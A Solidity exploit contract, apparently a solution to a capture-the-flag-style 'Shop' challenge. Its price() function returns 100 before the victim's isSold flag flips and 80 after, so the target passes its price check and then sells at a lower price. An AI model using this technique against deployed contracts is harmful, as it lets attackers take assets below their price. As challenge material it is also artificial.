// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { Shop } from "./Shop.sol";


contract ShopAttack{
    Shop victim;
    constructor(address _v) {
        victim = Shop(payable(_v));
    }

    function buy() public {
         victim.buy();
    }

    function price() external view returns (uint256){
        if(victim.isSold() == false){
            return 100;
        }
        else{
            return 80;
        }
    }
}